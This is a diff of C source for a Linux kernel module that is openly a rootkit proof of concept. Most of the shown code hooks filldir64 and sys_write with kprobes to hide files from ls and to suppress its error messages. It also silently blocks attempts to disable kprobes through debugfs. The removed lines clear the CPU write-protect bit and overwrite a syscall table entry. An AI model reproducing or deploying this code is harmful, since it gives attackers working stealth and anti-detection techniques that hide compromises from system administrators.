@@ -1,3 +1,8 @@
+/*
+ * Build a seperate Makefile for this -- its mostly just proof of concept 
+ * so you might just want to build upon the ideas that it utilizes.	
+ */
+
 #include <linux/kprobes.h>
 #include <linux/module.h>
 #include <linux/fs.h>
@@ -5,6 +10,7 @@
 #include <linux/dirent.h>
 #include <linux/file.h>
 #include <linux/sched.h>
+#include <asm/uaccess.h>
 
 MODULE_LICENSE("GPL");
 
@@ -36,14 +42,13 @@ static struct global_dentry_info
 
 /* CHANGE THE NEXT 2 LINES TO MATCH YOUR SYSTEM (YES TOO LAZY TO PUT AN INSTALL SCRIPT SORRY)
  */
-unsigned long (*n_kallsyms_lookup_name)(char *) = 0xffffffff810e3d20;
-long enabled_ino = 1172; // change this to ls -i of /sys/kernel/debug/kprobes/enabled
-long kp_list_ino = 1171; // change this to ls -i of /sys/kernel/debug/kprobes/list
+unsigned long (*n_kallsyms_lookup_name)(char *) = 0xc0181670;
+long enabled_ino = 5037; // change this to ls -i of /sys/kernel/debug/kprobes/enabled
+long kp_list_ino = 5036; // change this to ls -i of /sys/kernel/debug/kprobes/list
 asmlinkage long (*_sys_close)(unsigned int fd);
 asmlinkage long (*_sys_open)(const char __user *filename, int flags, int mode);
 char * (*_get_task_comm)(char *, struct task_struct *);
 
-void *sys_call_table = (void **)0xffffffff81801400;
 /* Our jprobe handler that globally saves the pointer value of dirent->d_name */
 /* so that our kretprobe can modify that location */
 static int j_filldir64(void * __buf, const char * name, int namlen, loff_t 
@@ -116,9 +121,10 @@ asmlinkage static int j_sys_write(int fd, void *buf, unsigned int len)
         /* From being able to send 'cannot access' */
         /* in their stderr stream, possibly */       
         _get_task_comm(comm, current);
-        if (strcmp(comm, "ls") != 0)
-                goto out;
-
+	printk("comm: %s\n", comm);
+        if (strcmp(comm, "ls"))	
+                goto do_inode_check;
+	else	
         /* check to see if this is an ls stat complaint, or ls -l weirdness */
         /* There are two separate calls to sys_write hence two strstr checks */
         if (strstr(s, "cannot access") || strstr(s, "ls:"))  
@@ -126,12 +132,14 @@ asmlinkage static int j_sys_write(int fd, void *buf, unsigned int len)
                 printk("Going to redirect\n");
                 goto redirect;  
         }
+
+do_inode_check:
         /* Check to see if they are trying to disable kprobes */
         /* with 'echo 0 > /sys/kernel/debug/kprobes/enabled' */
         file = fget(fd);
         if (!file)
                 goto out;
-        dentry = dget(file->f_dentry);
+        dentry = dget(file->f_path.dentry);
         if (!dentry)
                 goto out;
         ino = dentry->d_inode->i_ino;
@@ -139,18 +147,14 @@ asmlinkage static int j_sys_write(int fd, void *buf, unsigned int len)
         fput(file);
 	/* If someone tries to disable kprobes or tries to see our probes */
 	/* in /sys/kernel/debug/kprobes, it aint happening */
-        if (ino != enabled_ino && ino != kp_list_ino)
-                goto out; 
-	if (ino == kp_list_ino)
+        if (ino == enabled_ino)
 	{
-		if (strstr(s, "sys_write"))
-			goto redirect;
-		if (strstr(s, "filldir64"))
-			goto redirect;
-		goto out;
+		printk("ino: %u\n", ino);	
+		goto redirect;
 	}
-			
-        redirect:
+	else
+		goto out;
+redirect:
         /* If we made it here, then we are doing a redirect to /dev/null */
         stream_redirect++;
         mm_segment_t o_fs = get_fs();
@@ -199,36 +203,8 @@ static struct kretprobe syswrite_kp =
 	.maxactive = NR_CPUS
 };
 
-static void disable_wp(void)
-{
-        unsigned long cr0_value;
-        
-        asm volatile ("mov %%cr0, %0" : "=r" (cr0_value));
-        
-        /* Disable WP */
-        cr0_value &= ~(1 << 16);
-        
-        asm volatile ("movq %0, %%cr0" :: "r" (cr0_value));
-
-}
-        
-/* FUNCTION TO RE-ENABLE WRITE PROTECT BIT IN CPU */
-static void enable_wp(void)
-{
-        unsigned long cr0_value;
-
-        asm volatile ("movq %%cr0, %0" : "=r" (cr0_value));
-
-        /* Enable WP */
-        cr0_value |= (1 << 16);
-
-        asm volatile ("movq %0, %%cr0" :: "r" (cr0_value));
-
-}
-
 void exit_module(void)
 {
-
 	unregister_kretprobe(&filldir64_kp);
         unregister_kretprobe(&syswrite_kp);
         
@@ -240,10 +216,6 @@ int init_module(void)
 	filldir64_kp.kp.addr = syswrite_jp.kp.addr = (kprobe_opcode_t *)n_kallsyms_lookup_name("sys_write");
 	filldir64_kp.kp.addr = filldir64_jp.kp.addr = (kprobe_opcode_t *)n_kallsyms_lookup_name("filldir64");
 	
-	disable_wp();
-	sys_call_table[21] = (void *)0x000031337;
-	enable_wp();
-
 	_sys_close = (void *)n_kallsyms_lookup_name("sys_close");
 	_sys_open = (void *)n_kallsyms_lookup_name("sys_open");
 	_get_task_comm = (void *)n_kallsyms_lookup_name("get_task_comm");
